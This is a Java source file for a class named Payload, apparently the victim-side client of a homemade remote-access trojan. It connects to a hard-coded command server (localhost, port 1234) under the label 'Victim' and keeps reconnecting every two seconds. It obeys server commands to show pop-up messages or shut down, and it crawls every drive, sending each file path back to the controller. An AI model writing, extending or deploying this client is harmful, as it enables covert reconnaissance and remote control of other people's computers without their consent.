import java.awt.event.*;
import java.io.*;
import java.net.*;
import java.util.*;
import javax.swing.Timer;
import javax.swing.SwingUtilities;
import javax.swing.*;
public class Payload implements ActionListener
{     	
	String msg;
	String tempMsg;
	Talker talker;
	Timer timer;
	
	Thread fileSearchThread;
				
    
    //============================Constructor===================================
	Payload()
	{
		System.out.println("Payload Started...");
		try
		{
			System.out.println("Command Handler Started!");
			System.out.println("Attempting to Connect to Server...");
			talker = new Talker("127.0.0.1", 1234, "Victim");
			
			waitForCommand();
		}
		catch (Exception e)
		{
		
			System.out.println("There was a problem connecting to the server: ");
			System.out.println(e);
			System.out.println("Trying to reconnect in 2 seconds...");
		
			timer = new Timer(2000, this);
			timer.setActionCommand("RECONNECT");
			timer.setRepeats(true);
			timer.start();
		}
		
		
	}
	public void searchForFiles()
	{
		System.out.println("Starting File Crawler...");
		int numOfFiles;
		File currentFile;
		File currentRoot;
		LinkedList <File>folderQueue;
		File[] rootArray = File.listRoots();
		LinkedList <File> fileArray;
		System.out.println("Crawling...");
		try
		{
			talker.send("STARTEDCRAWLING");
		}
		catch(IOException ioe)
		{
			System.out.println("Had trouble sending Server our current status with searching.");
		}
		System.out.println("Number of Roots: " + rootArray.length);
		folderQueue = new LinkedList();
		//fileArray = new LinkedList();
		for (int i = 0; i < rootArray.length; i++)
		{	
			folderQueue.add(rootArray[i]);
			System.out.println(File.listRoots()[i]);
			System.out.println("Current Root: " + i);
		}
		while(folderQueue.peek() != null)
		{
			currentRoot = folderQueue.remove();
			numOfFiles = currentRoot.listFiles().length;
			System.out.println("CURRENT DIRECTORY: " + currentRoot);
			System.out.println("Number of Files in current Directory: " + numOfFiles);
			for(int x = 0; x < numOfFiles; x++)
			{
				currentFile = currentRoot.listFiles()[x];
				if (currentFile.isDirectory())
				{
					System.out.println("Found Folder: " + currentFile + "; Adding to Queue;");
					folderQueue.add(currentFile);
				}
				else
				{
					System.out.println("*** FOUND FILE: '" + currentFile + "' ***");
					try
					{
						talker.send("INCOMINGFILE");
						talker.send(currentFile.getAbsolutePath());
					}
					catch(IOException ioe)
					{
						System.out.println("We had trouble trying to send the client our file path.");
						System.out.println(ioe);
					}
				}
			}
		}
		try
		{
			System.out.println("We're done searching!");
			talker.send("DONESEARCHING");
		}
		catch(IOException ioe)
		{
			System.out.println("We had an issue telling the server that we're done with our search.");
			System.out.println(ioe);
		}
		
	}
	public void waitForCommand()
	{
		try
		{
			talker.send("INCOMINGCLIENT");//Tell Server ID.
		}
		catch(IOException ioe)
		{
			System.out.println("Had Trouble telling the server that we want to to connect.");
		}
		
		System.out.println("Inside Run for Command Handler!");
		while(true)
		{
			try
			{
				msg = talker.received();
				if (msg.equals("SENDMESSAGE"))
				{
					System.out.println("Was Asked to show a JOptionPane Message!");
					try
					{
						talker.send("ACCEPTMESSAGE");
						try
						{
							tempMsg = talker.received();
							SwingUtilities.invokeLater(new Runnable()
							{
								
								public void run()
								{
									JOptionPane.showMessageDialog(null, tempMsg, "Message", JOptionPane.PLAIN_MESSAGE);
								}
							});
						}
						catch(IOException ioe)
						{
							System.out.println("Had an issue with getting the message to display from the server.");
							System.out.println(ioe);
						}		
					}
					catch(IOException ioe)
					{
						System.out.println("We had an issue with asking the server to send the message to us!");
						System.out.println(ioe);
					}
				}
				else if (msg.equals("SHUTDOWNCLIENT"))
				{
					System.out.println("Was asked to shutdown...");
					try
					{
						talker.send("DISCONNECTED");
						System.exit(1);
					}
					catch(IOException ioe)
					{
						System.out.println("Had a problem telling the server we're disconnecting!");
					}
					//System.exit(1);
				}
				else if (msg.equals("STARTSEARCH"))
				{
					fileSearchThread = new Thread(new Runnable()
						{
							public void run()
							{
								searchForFiles();
							}
							
						});
						fileSearchThread.start();
				}
				else if (msg.equals("WELCOME"))
				{
					System.out.println("Successfully Handshaked!");
				}
				else if (msg.contains("MSG: "))
				{
					tempMsg = msg.substring(0, 6);
					
				}
			}
			catch(IOException ioe)
			{
				System.out.println("We had an issue with the CommandHandler Thread!");
				System.out.println(ioe);
			}
		}
				
	}
	
	public void actionPerformed(ActionEvent e)
	{
		String cmd;

		cmd = e.getActionCommand();
	
		if (cmd.equals("RECONNECT"))
		{
			try
			{
				System.out.println("Attempting to Reconnect to server...");
				talker = new Talker("127.0.0.1", 1234, "Victim");
				waitForCommand();
				timer.stop();
			}
			catch (Exception ex)
			{
		
				System.out.println("There was a problem connecting to the server: ");
				System.out.println(ex);
				System.out.println("Trying to reconnect in 2 seconds...");
				System.out.println("===================================");
			}
		}
	}
}//End of class MyFrameClass

